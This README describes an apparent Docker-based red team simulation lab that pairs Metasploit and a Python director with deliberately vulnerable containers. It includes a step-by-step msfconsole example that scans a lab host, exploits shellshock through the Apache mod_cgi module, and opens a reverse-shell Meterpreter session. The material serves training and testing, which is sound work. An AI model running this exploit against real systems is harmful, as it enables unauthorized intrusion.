# redteam

Red Team simulation

## Requirements

1. Install docker and docker-compose


## Components

- Postgres database
- Vulnerable hosts:
  - Apache httpd vulnerable to shellshock
  - DVWA (Damn Vulnerable Web Application)
- Metasploit RPC api (red team worker)
- Python director (red team director)
- Metasploit console (for debugging)


## Usage

1. Start the database: `docker-compose -f docker-compose-db.yml up -t 2`
   (persistence is disabled, removing the container will reset the data)
1. Start director and workers: `docker-compose -f docker-compose-workers.yml up -t 2`
1. Start the director: `docker-compose up --build -t 2`


## Manual use of metasploit

If you want to debug the state of the database or perform 
manual actions in metasploit, you can connect to the
msfconsole by ```docker attach redteam_msfconsole_1```


Example attack:


Scan the hostname "target2"
```
> db_nmap target2
```

Check that the host is now in the database
```
> hosts
Hosts
=====

address     mac                name                               os_name  os_flavor  os_sp  purpose  info  comments
-------     ---                ----                               -------  ---------  -----  -------  ----  --------
172.19.0.3  02:42:ac:13:00:03  redteam_target2_1.redteam_default  Unknown                    device         
```

Check which services are now in the database
```
> services
Services
========

host        port  proto  name   state  info
----        ----  -----  ----   -----  ----
172.19.0.3  80    tcp    http   open 
```

Let's assume you expect the host to be vulnerable to shellshock, let's exploit it:
```
> use exploit/multi/http/apache_mod_cgi_bash_env_exec
> show options
> set RHOSTS target2
> set TARGETURI /cgi-bin/stats
```

Run the exploit:
```
> exploit

[*] Started reverse TCP handler on 172.19.0.6:4444 
[*] Command Stager progress - 100.46% done (1097/1092 bytes)
[*] Sending stage (976712 bytes) to 172.19.0.3
[*] Meterpreter session 1 opened (172.19.0.6:4444 -> 172.19.0.3:60846) at 2020-11-04 12:52:22 +0000

meterpreter >
```

Profit!


